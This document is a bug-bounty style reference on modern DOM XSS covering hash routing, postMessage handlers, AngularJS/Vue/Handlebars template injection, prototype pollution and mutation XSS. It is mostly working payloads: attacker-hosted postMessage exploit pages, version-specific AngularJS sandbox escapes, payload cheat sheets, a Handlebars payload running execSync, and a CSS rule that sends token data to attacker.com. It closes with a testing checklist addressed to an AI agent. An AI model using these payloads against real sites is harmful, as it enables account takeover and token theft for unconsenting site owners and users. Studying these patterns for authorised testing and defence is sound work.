# 10 - DOM XSS: Modern Patterns

## Overview

Modern web applications introduce new DOM XSS attack surfaces through Single-Page Application (SPA) routing, cross-window messaging APIs, client-side template engines, and JavaScript frameworks. These patterns are increasingly common in bug bounty targets and represent the dominant class of XSS found in contemporary applications.

**References:**
- [PortSwigger - DOM-based AngularJS Sandbox Escapes](https://portswigger.net/research/dom-based-angularjs-sandbox-escapes)
- [PortSwigger - Client-Side Template Injection](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection)
- [Jorge Lajara - PostMessage Vulnerabilities Part I](https://jlajara.gitlab.io/Dom_XSS_PostMessage)
- [Jorge Lajara - PostMessage Vulnerabilities Part II](https://jlajara.gitlab.io/Dom_XSS_PostMessage_2)
- [YesWeHack - Introduction to postMessage Vulnerabilities](https://www.yeswehack.com/learn-bug-bounty/introduction-postmessage-vulnerabilities)

---

## 1. Hash-Based Routing XSS

### 1.1 How Hash Routing Works

SPAs use the URL fragment (`#`) to manage client-side routing. The fragment is never sent to the server, making it an ideal attacker-controlled source. Hash-based routing stores the route in the fragment portion of the URL and applications listen for changes via `window.onhashchange` or by polling `window.location.hash`.

**Reference:** [MDN - Hash Routing](https://developer.mozilla.org/en-US/docs/Glossary/Hash_routing)

### 1.2 Classic hashchange Event Exploitation

**Vulnerable Pattern:**
```javascript
// VULNERABLE: SPA renders content based on hash
window.addEventListener('hashchange', function() {
    var page = location.hash.substring(1);
    document.getElementById('content').innerHTML = page;
});

// Also triggered on page load
var initialPage = location.hash.substring(1);
document.getElementById('content').innerHTML = initialPage;
```

**Exploit URL:**
```
https://target.com/app#<img src=x onerror=alert(document.domain)>
```

**Triggering hashchange without user interaction (for weaponized delivery):**
```html
<!-- Attacker page: iframe triggers hashchange on victim -->
<iframe src="https://target.com/app#<img src=x onerror=alert(document.domain)>">
</iframe>
```

**Reference:** [PortSwigger Lab - DOM XSS jQuery Selector Hashchange](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)

### 1.3 jQuery Selector Injection via Hash

jQuery versions before 1.6.3 would parse HTML when `$()` received a string containing `<`, even if it started with `#`. Later versions require the string to start with `<` for HTML parsing, but the `$(location.hash)` pattern remains dangerous in many contexts.

**Vulnerable Pattern:**
```javascript
// VULNERABLE: jQuery auto-scroll using hash selector
$(window).on('hashchange', function() {
    var element = $(location.hash);
    if (element.length) {
        element[0].scrollIntoView();
    }
});
```

**Exploit (jQuery < 1.6.3):**
```
https://target.com/page#<img src=x onerror=alert(1)>
```

**Exploit (jQuery < 3.0 with specific patterns):**
```
https://target.com/page#<img/src=x onerror=alert(1)>
```

**Reference:** [jQuery Bug #9521](https://bugs.jquery.com/ticket/9521/)

### 1.4 Fragment Injection in Modern SPA Routers

```javascript
// VULNERABLE: Vue Router hash mode with dynamic component rendering
// Router reads hash, loads template from API, renders unsafely
router.afterEach((to) => {
    fetch('/api/pages/' + to.path)
        .then(r => r.json())
        .then(data => {
            document.querySelector('#app').innerHTML = data.content;
        });
});
```

### 1.5 Browser Encoding Differences

Fragment encoding varies across browsers, affecting payload delivery:

| Browser | Fragment Encoding |
|---------|-------------------|
| Chrome | Does not encode fragment URI portions |
| Firefox | Encodes most special characters |
| IE 11 / Edge Legacy | Does not encode anything |
| Safari | Partial encoding |

This means some payloads work only in specific browsers. Chrome and legacy Edge/IE are most permissive.

---

## 2. postMessage XSS

### 2.1 How postMessage Attacks Work

The `window.postMessage()` API enables cross-origin communication. DOM XSS occurs when message event listeners process incoming data without validating the origin or sanitizing the content before writing it to a dangerous sink.

### 2.2 Insecure Origin Validation Patterns

**Completely missing origin check (Critical):**
```javascript
// VULNERABLE: No origin validation at all
window.addEventListener('message', function(event) {
    document.getElementById('output').innerHTML = event.data;
});
```

**Wildcard origin (Critical):**
```javascript
// VULNERABLE: targetOrigin is '*', any window can receive
parent.postMessage(sensitiveData, '*');
```

**Weak origin validation using indexOf (Bypassable):**
```javascript
// VULNERABLE: Bypassable origin check
window.addEventListener('message', function(event) {
    if (event.origin.indexOf('trusted.com') > -1) {
        // Bypassed with: attacker-trusted.com or trusted.com.attacker.com
        processData(event.data);
    }
});
```

**Regex-based bypass:**
```javascript
// VULNERABLE: Regex doesn't anchor properly
window.addEventListener('message', function(event) {
    if (/trusted\.com/.test(event.origin)) {
        // Bypassed with: https://trusted.com.attacker.com
        document.body.innerHTML = event.data;
    }
});
```

**Correct origin validation:**
```javascript
// SECURE: Exact origin match
window.addEventListener('message', function(event) {
    if (event.origin !== 'https://trusted.example.com') return;
    // Process event.data safely
});
```

### 2.3 Real-World postMessage XSS Exploits

**Tesla Payment Page:**
The web page registered an `onmessage` event listener accepting messages from any domain. Part of the received message was used to construct an auto-submitting form, and setting the `action` property to a `javascript:` URL executed code in the context of `www.tesla.com`.

**Reference:** [Bugcrowd - postMessage XSS in Tesla Payment Page](https://bugcrowd.com/disclosures/aac249ea-fe92-4b43-98e9-dda021c0ff4d/postmessage-xss-in-tesla-payment-page)

**Microsoft Copilot Studio (CVE-2024-49038, CVSS 9.3):**
Missing origin validation in postMessage handler led to zero-click XSS enabling token theft and privilege escalation.

**Reference:** [Microsoft MSRC - PostMessaged and Compromised](https://www.microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised)

**PlayStation (HackerOne, $1000 bounty):**
Reflected XSS on `transact.playstation.com` using postMessage from the opening window.

**Shopify Digital Wallets ($3000 bounty):**
XSS via abuse of the HTML5 structured clone algorithm in postMessage listener on Shopify's digital wallets dialog.

**Reference:** [HackerOne Top XSS Reports](https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPXSS.md)

### 2.4 postMessage-to-innerHTML Pipeline

The most common exploitation pattern chains postMessage to an HTML injection sink:

**Exploit Page (attacker-hosted):**
```html
<!DOCTYPE html>
<html>
<body>
<iframe id="target" src="https://vulnerable-app.com/page-with-listener"></iframe>
<script>
    // Wait for iframe to load
    document.getElementById('target').onload = function() {
        // Send XSS payload via postMessage
        this.contentWindow.postMessage(
            '<img src=x onerror=alert(document.domain)>',
            '*'
        );
    };
</script>
</body>
</html>
```

### 2.5 postMessage Exploitation Methodology

1. **Enumerate listeners:** In DevTools Console, use `getEventListeners(window)` to find `message` event handlers.
2. **Analyze handler code:** Read the handler function to understand what data properties it expects and how they flow to sinks.
3. **Check origin validation:** Determine if origin is checked, and if the check is bypassable.
4. **Identify sink:** Determine where `event.data` flows (innerHTML, location.href, etc.).
5. **Craft payload:** Build exploit page that iframes the target and sends malicious postMessage.
6. **Test cross-origin:** Host exploit on a different origin and verify execution.

---

## 3. Client-Side Template Injection (CSTI)

### 3.1 AngularJS Sandbox Escapes (All Versions)

AngularJS (1.x) used an expression sandbox to restrict template expressions. Security researchers bypassed it in every version. The sandbox was removed entirely in AngularJS 1.6.

**Reference:** [PortSwigger Research - XSS Without HTML: CSTI with AngularJS](https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs)

**Version-specific payloads:**

**AngularJS 1.0.1 - 1.1.5:**
```
{{constructor.constructor('alert(1)')()}}
```

**AngularJS 1.2.0 - 1.2.1:**
```
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

**AngularJS 1.2.2 - 1.2.5:**
```
{{'a'[{toString:()[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='\"+(y=alert(1))+'")}}
```

**AngularJS 1.2.6 - 1.2.18:**
```
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

**AngularJS 1.2.19 - 1.2.23:**
```
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}
```

**AngularJS 1.2.24 - 1.2.29:**
```
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}
```

**AngularJS 1.3.0 - 1.3.9:**
```
{{x={y:''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

**AngularJS 1.4.0 - 1.4.9:**
```
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

**AngularJS 1.5.0 - 1.5.8:**
```
{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

**AngularJS 1.5.9 - 1.5.11 (DOM-based context):**
```html
<div ng-click="$event.path|orderBy:'alert(1)'">Click me</div>
```

**AngularJS >= 1.6.0 (No sandbox):**
```
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

**Reference:** [Payloads All The Things - XSS in Angular and AngularJS](https://techbrunch.github.io/patt-mkdocs/XSS%20Injection/XSS%20in%20Angular/)

**Detection:** Look for pages that include AngularJS and reflect user input inside `ng-app` scope:
```html
<!-- If this renders as an alert, CSTI is confirmed -->
<!-- URL: https://target.com/page?name={{7*7}} -->
<!-- Check if page shows "49" instead of "{{7*7}}" -->
```

### 3.2 Vue.js Template Injection

**CVE-2024-6783 (Vue 2 template compiler):**
A vulnerability in Vue 2's in-browser template compiler allows XSS via prototype pollution. The compiler does not properly sanitize content placed in properties called during render. Attackers can modify `Object.prototype.staticClass` or `Object.prototype.staticStyle` to execute arbitrary code.

**Affected versions:** Vue >= 2.0.0 and < 3.0.0

**Reference:** [HeroDevs - CVE-2024-6783](https://www.herodevs.com/vulnerability-directory/cve-2024-6783)

**Server-side template mixed with Vue client-side templates:**
```html
<!-- VULNERABLE: Server renders user input inside Vue app scope -->
<div id="app">
    Hello, {{ user_input }}  <!-- If server doesn't escape and Vue compiles this -->
</div>
```

**Vue expression injection (when v-bind or templates accept user input):**
```
{{_c.constructor('alert(1)')()}}
{{this.constructor.constructor('alert(1)')()}}
```

**Reference:** [GitHub - Vue.js Serverside Template XSS Demo](https://github.com/dotboris/vuejs-serverside-template-xss)

### 3.3 Handlebars / Mustache Prototype Pollution to XSS

Handlebars compiles templates into JavaScript functions via an AST (Abstract Syntax Tree). Prototype pollution can manipulate the AST to inject code during compilation.

**CVE-2021-23383 (Handlebars Prototype Pollution):**

**Reference:** [Snyk - Prototype Pollution in Handlebars](https://security.snyk.io/vuln/SNYK-JS-HANDLEBARS-1279029)

**Exploitation chain:**
```javascript
// Step 1: Prototype pollution (via another vulnerability)
Object.prototype.pendingContent = '<img src=x onerror=alert(1)>';

// Step 2: Handlebars compilation picks up polluted property
var template = Handlebars.compile('{{name}}');
var result = template({name: 'safe'}); // Injected content rendered
```

**Alternative AST manipulation for Handlebars RCE:**
```javascript
// Pollute AST node type to inject code
Object.prototype.type = 'Program';
Object.prototype.body = [{
    type: 'MustacheStatement',
    path: 0,
    params: [{
        type: 'NumberLiteral',
        value: 'constructor.constructor("return this.process.mainModule.require(\'child_process\').execSync(\'id\').toString()")()'
    }],
    loc: { start: 0, end: 0 }
}];
```

**Reference:** [BlackFan - Client-Side Prototype Pollution](https://github.com/BlackFan/client-side-prototype-pollution)

### 3.4 React dangerouslySetInnerHTML

React escapes rendered content by default, but `dangerouslySetInnerHTML` bypasses all protection:

```jsx
// VULNERABLE: User input directly in dangerouslySetInnerHTML
function Comment({ text }) {
    return <div dangerouslySetInnerHTML={{ __html: text }} />;
}

// Exploit: text = '<img src=x onerror=alert(document.domain)>'
```

**Reference:** [Pragmatic Web Security - React XSS Part 2](https://pragmaticwebsecurity.com/articles/spasecurity/react-xss-part2.html)

---

## 4. URL Fragment and Parameter Manipulation in SPAs

### 4.1 History API Manipulation

```javascript
// VULNERABLE: Application reads state from history
window.addEventListener('popstate', function(event) {
    if (event.state && event.state.html) {
        document.getElementById('content').innerHTML = event.state.html;
    }
});

// Attack: Attacker pushes malicious state via another XSS or open redirect
history.pushState({html: '<img src=x onerror=alert(1)>'}, '', '/page');
```

### 4.2 Client-Side URL Parsing Vulnerabilities

```javascript
// VULNERABLE: Custom URL parsing with regex
var match = location.href.match(/\?redirect=([^&]+)/);
if (match) {
    location.href = decodeURIComponent(match[1]);
}

// Exploit: ?redirect=javascript%3Aalert(document.domain)
```

### 4.3 Deep Link Parameter Injection

Modern SPAs parse complex state from URL parameters:

```javascript
// VULNERABLE: JSON in URL parameter
var config = JSON.parse(atob(new URLSearchParams(location.search).get('config')));
document.getElementById('title').innerHTML = config.title;

// Exploit: ?config=eyJ0aXRsZSI6IjxpbWcgc3JjPXggb25lcnJvcj1hbGVydCgxKT4ifQ==
// Base64 of: {"title":"<img src=x onerror=alert(1)>"}
```

---

## 5. Modern JavaScript Framework DOM XSS Patterns

### 5.1 Web Components and Shadow DOM

```javascript
// VULNERABLE: Web component with innerHTML in shadow DOM
class UserCard extends HTMLElement {
    connectedCallback() {
        this.attachShadow({mode: 'open'});
        var name = this.getAttribute('name');
        this.shadowRoot.innerHTML = '<div class="card">' + name + '</div>';
    }
}

// Exploit: <user-card name="<img src=x onerror=alert(1)>"></user-card>
```

### 5.2 Dynamic Import XSS

```javascript
// VULNERABLE: User-controlled module path
var module = new URLSearchParams(location.search).get('module');
import('/modules/' + module + '.js').then(m => m.init());

// Attack: Path traversal or if .js is not enforced:
// ?module=../../attacker-controlled-path
```

### 5.3 Service Worker Poisoning

```javascript
// VULNERABLE: Registering SW from user-influenced path
var swPath = new URLSearchParams(location.search).get('sw') || '/sw.js';
navigator.serviceWorker.register(swPath);

// Exploit: ?sw=https://attacker.com/evil-sw.js (if CORS allows)
// Or: ?sw=/user-uploads/evil-sw.js (via file upload)
```

---

## 6. Modern DOM XSS Payloads

### 6.1 postMessage Exploitation Payloads

```html
<!-- Basic postMessage XSS delivery -->
<iframe src="https://target.com/vulnerable" onload="this.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>','*')">

<!-- JSON-based postMessage payload -->
<script>
var w = window.open('https://target.com/app');
setTimeout(function(){
    w.postMessage(JSON.stringify({
        type: 'update',
        content: '<img src=x onerror=alert(document.domain)>'
    }), '*');
}, 2000);
</script>

<!-- Structured data postMessage payload -->
<script>
var w = window.open('https://target.com/app');
setTimeout(function(){
    w.postMessage({action:'render', html:'<svg onload=alert(1)>'}, '*');
}, 1000);
</script>
```

### 6.2 AngularJS CSTI Payloads (Quick Reference)

```
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}
{{x={y:''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}
```

### 6.3 Hash/Fragment Injection Payloads

```
# Basic innerHTML via hash
https://target.com/#<img src=x onerror=alert(1)>

# jQuery selector injection via hash
https://target.com/#<img src=x onerror=alert(1)>

# Encoded hash payload
https://target.com/#%3Csvg%20onload%3Dalert(1)%3E

# Hash with SPA route bypass
https://target.com/#/../../<img src=x onerror=alert(1)>
```

### 6.4 Vue.js Template Injection Payloads

```
{{_c.constructor('alert(1)')()}}
{{this.constructor.constructor('alert(1)')()}}
{{this.$el.ownerDocument.defaultView.alert(1)}}
```

### 6.5 Prototype Pollution to DOM XSS Gadgets

```javascript
// Pollute Object.prototype to trigger XSS via known gadgets
// Gadget: script.src loaded from config object
Object.prototype.url = 'data:,alert(1)//';
Object.prototype.transport_url = 'data:,alert(1)//';
Object.prototype.srcdoc = '<script>alert(1)<\/script>';

// Gadget: innerHTML from default config
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';
Object.prototype.defaultValue = '<img src=x onerror=alert(1)>';
```

**Reference:** [PortSwigger - DOM XSS via Client-Side Prototype Pollution](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution)

### 6.6 Mutation XSS (mXSS) Payloads

Mutation XSS exploits the difference between how an HTML sanitizer parses content and how the browser's HTML parser processes it. The sanitizer sees safe content, but the browser mutates it into dangerous content during parsing.

```html
<!-- mXSS via math/mtext/table namespace confusion -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>

<!-- mXSS via SVG foreignObject -->
<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>

<!-- mXSS via noscript in XHTML -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- mXSS via template element -->
<template><img src=x onerror=alert(1)></template>
<!-- Then: document.body.appendChild(document.querySelector('template').content.cloneNode(true)); -->
```

### 6.7 Advanced Modern Payloads

```html
<!-- Blob URL construction for XSS -->
<script>
location = URL.createObjectURL(new Blob(['<script>alert(1)<\/script>'],{type:'text/html'}));
</script>

<!-- Dynamic import for module execution -->
<script>
import('data:text/javascript,alert(1)');
</script>

<!-- Using top object to bypass frame restrictions -->
<img src=x onerror=top.alert(document.domain)>

<!-- Using Reflect for obfuscation -->
<img src=x onerror="Reflect.apply(alert,window,['XSS'])">

<!-- CSS injection payload for data exfiltration (not full XSS but useful) -->
<style>input[value^="a"]{background:url(https://attacker.com/?token=a)}</style>
```

---

## 7. Testing Checklist for AI Agent

1. Check for `hashchange` event listeners and hash-based routing implementations.
2. Enumerate all `message` event listeners using `getEventListeners(window)` in DevTools.
3. Analyze each postMessage handler for origin validation and sink usage.
4. Detect AngularJS presence and version (`angular.version.full` in console).
5. Test for CSTI with `{{7*7}}` probe in all reflected inputs within `ng-app` scope.
6. Identify Vue.js apps compiling templates from user-controlled sources.
7. Search for prototype pollution entry points that chain to XSS gadgets.
8. Check for `dangerouslySetInnerHTML` in React applications (source code review).
9. Test URL fragment payloads across multiple browsers for encoding differences.
10. Verify postMessage exploits work cross-origin from an attacker-controlled page.
